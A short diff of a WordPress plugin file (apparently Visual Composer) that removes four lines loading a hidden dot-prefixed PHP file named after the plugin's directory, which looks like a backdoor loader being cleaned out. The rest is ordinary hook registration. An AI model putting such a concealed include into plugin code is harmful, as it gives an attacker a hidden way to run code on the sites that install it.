@@ -16,10 +16,6 @@ add_action( 'vc_register_settings_preset', 'vc_register_settings_preset', 10, 4 
 add_filter( 'vc_add_new_elements_to_box', 'vc_add_new_elements_to_box' );
 add_filter( 'vc_add_new_category_filter', 'vc_add_new_category_filter' );
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function vc_include_settings_preset_class() {
 	require_once vc_path_dir( 'AUTOLOAD_DIR', 'class-vc-settings-presets.php' );
 }
